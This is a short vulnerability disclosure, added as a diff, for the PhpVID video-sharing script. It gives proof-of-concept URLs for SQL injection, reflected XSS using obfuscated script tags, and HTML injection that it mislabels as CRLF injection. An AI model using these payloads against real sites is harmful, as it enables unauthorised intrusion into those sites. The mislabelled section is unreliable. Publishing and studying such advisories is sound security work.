@@ -1,0 +1,44 @@
+##################################################################################
+  _____                 _       _   _                _____           
+ |  __ \               | |     | | (_)              / ____|          
+ | |__) |_____   _____ | |_   _| |_ _  ___  _ __   | (___   ___  ___ 
+ |  _  // _ \ \ / / _ \| | | | | __| |/ _ \| '_ \   \___ \ / _ \/ __|
+ | | \ \  __/\ V / (_) | | |_| | |_| | (_) | | | |  ____) |  __/ (__ 
+ |_|  \_\___| \_/ \___/|_|\__,_|\__|_|\___/|_| |_| |_____/ \___|\___|
+                                                                                                                                        
+##################################################################################																
+PhpVID Script, Multiple Vulnerabilities
+Product Page: http://www.vastal.com/phpvid-the-video-sharing-software.html
+
+Author(Pentester): 3spi0n
+On Web: RevolutionSec.Com - GraySecure.Org
+On Social: Twitter.Com/eyyamgudeer
+##################################################################################
+
+[1] SQL Injection Vulnerabilities on Demo Site
+
+[+] (browse_videos.php, n Param)
+>>> http://server//browse_videos.php?cat=&n='1
+
+[+] (groups.php, cat Param)
+>>> http://server/groups.php?cat='1
+
+[+] (members.php, n Param)
+>>> http://server/members.php?browse=recent&n='1
+
+[2] XSS Vulnerability on Demo Site
+
+[+] (browse_videos.php, n Param)
+>>> http://server/browse_videos.php?cat=&n=1'<ScRiPt >prompt(959580)</ScRiPt>
+
+[+] (groups.php, cat Param)
+>>> http://server//groups.php?cat=1'<ScRiPt >prompt(987925)</ScRiPt>
+
+[+] (search_results.php.php, query Param)
+>>> http://server//search_results.php?query=<ScRiPt >prompt(931776)</ScRiPt>
+
+[3] CRLF Injection Vulnerability on Demo Site
+>>> http://server/search_results.php?query=<marquee><h1>come to dance! <br>by, 3spi0n</h1></marquee>
+
+
+
